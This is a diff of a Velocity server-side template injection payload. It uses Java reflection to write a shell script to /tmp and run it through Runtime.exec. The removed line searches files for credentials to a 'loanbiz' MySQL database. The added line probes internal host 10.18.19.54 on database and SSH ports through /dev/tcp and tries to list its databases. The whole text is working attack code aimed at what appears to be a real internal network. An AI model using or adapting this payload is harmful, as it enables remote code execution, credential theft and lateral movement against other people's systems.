@@ -1,6 +1,6 @@
 #set($x = "")
 #set($w2 = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$w2.write("xargs -a /tmp/grep_loanbiz.txt grep -iH -E 'jdbc:mysql.*loanbiz|loanbiz.*password|password.*loanbiz|username|user *=' 2>/dev/null | grep -iv 'create table\|insert into\|select ' | head -35")
+$w2.write("echo -n '54:3307 '; timeout 4 bash -c 'cat < /dev/null > /dev/tcp/10.18.19.54/3307' 2>/dev/null && echo OK || echo NO; echo -n '54:3309 '; timeout 4 bash -c 'cat < /dev/null > /dev/tcp/10.18.19.54/3309' 2>/dev/null && echo OK || echo NO; echo -n '54:3308 '; timeout 4 bash -c 'cat < /dev/null > /dev/tcp/10.18.19.54/3308' 2>/dev/null && echo OK || echo NO; echo -n '54:22 '; timeout 4 bash -c 'cat < /dev/null > /dev/tcp/10.18.19.54/22' 2>/dev/null && echo OK || echo NO; echo ===L54-3307===; timeout 10 mysql --connect-timeout=4 -h10.18.19.54 -P3307 -e 'show databases' 2>&1 | head -5")
 $w2.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
